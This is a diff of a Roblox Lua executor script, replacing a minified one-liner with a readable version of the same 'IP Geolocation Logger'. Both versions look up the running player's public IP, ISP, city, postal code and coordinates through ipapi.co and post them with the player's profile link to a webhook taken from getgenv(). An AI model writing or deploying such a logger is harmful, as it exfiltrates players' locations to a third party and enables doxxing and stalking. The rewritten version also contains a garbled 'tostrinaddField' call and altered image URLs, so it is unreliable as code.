@@ -1,1 +1,66 @@
-local a,b=game:GetService('HttpService'),game:GetService('Players').LocalPlayer local c,d=pcall(function()return a:JSONDecode(game:HttpGet('https://thumbnails.roblox.com/v1/users/avatar?userIds='..b.UserId..'&size=720x720&format=Png&isCircular=false')).data[1].imageUrl end)local e,f=pcall(function()return a:JSONDecode(game:HttpGet('https://ipapi.co/json'))end)f=e and f or{}local function g(h,i)return{name=h,value=f[i]and tostring(f[i])or'Not Found'}end pcall(function()(request or http_request or http and http.request)({Url=getgenv()['Webhook URL'],Method='POST',Body=a:JSONEncode({embeds={{color=1733608,fields={g('IP Address','ip'),g('Network Range','network'),g('ASN (Autonomous System Number)','asn'),g('ISP (Internet Service Provider)','org'),g('Country','country_name'),g('Region/Province','region'),g('City','city'),g('Postal Code','postal'),g('Latitude','latitude'),g('Longitude','longitude'),g('Timezone','timezone')}},{title="View "..b.Name.."'s full profile",url='https://www.roblox.com/users/'..b.UserId..'/profile',color=1733608,image={url=c and d or'https://i.ibb.co/mVYFTK2f/Avatar-Not-Found.png'}}},username='IP Geolocation Logger',avatar_url='https://i.ibb.co/spwWKyBW/Globe-With-Meridians.png'}),Headers={['content-type']='application/json'}})end)
+local httpService = game:GetService("HttpService")
+local player = game:GetService("Players").LocalPlayer
+
+local avatarSuccess, avatarUrl = pcall(function()
+	local thumbnailsResponse = game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. player.UserId .. "&size=720x720&format=Png&isCircular=false")
+
+	return httpService:JSONDecode(thumbnailsResponse).data[1].imageUrl
+end)
+
+local geolocationSuccess, geolocationData = pcall(function()
+	local ipapiResponse = game:HttpGet("https://ipapi.co/json")
+
+	return httpService:JSONDecode(ipapiResponse)
+end)
+geolocationData = geolocationSuccess and geolocationData or {}
+
+local function addField(name, value)
+	return {
+		name = name,
+		value = geolocationData[value] and tostrinaddField(geolocationData[value]) or "Not Found"
+	}
+end
+
+local payload = {
+	embeds = {
+		{
+			color = 1733608,
+			fields = {
+				addField("IP Address", "ip"),
+				addField("Network Range", "network"),
+				addField("ASN (Autonomous System Number)", "asn"),
+				addField("ISP (Internet Service Provider)", "org"),
+				addField("Country", "country_name"),
+				addField("Region/Province", "region"),
+				addField("City", "city"),
+				addField("Postal Code", "postal"),
+				addField("Latitude", "latitude"),
+				addField("Longitude", "longitude"),
+				addField("Timezone", "timezone")
+			}
+		},
+		{
+			title = "View " .. player.Name .. "'s full profile",
+			url = "https://www.roblox.com/users/" .. player.UserId .. "/profile",
+			color = 1733608,
+			image = {
+				url = avatarSuccess and avatarUrl or "https://i.ibb.co.com/mVYFTK2f/Avatar-Not-Found.png"
+			}
+		}
+	},
+	username = "IP Geolocation Logger",
+	avatar_url = "https://i.ibb.co.com/spwWKyBW/Globe-With-Meridians.png"
+}
+
+pcall(function()
+	local sendRequest = request or http_request or http and http.request
+
+	sendRequest({
+		Url = getgenv()["Webhook URL"],
+		Method = "POST",
+		Body = httpService:JSONEncode(payload),
+		Headers = {
+			["Content-Type"] = "application/json"
+		}
+	})
+end)
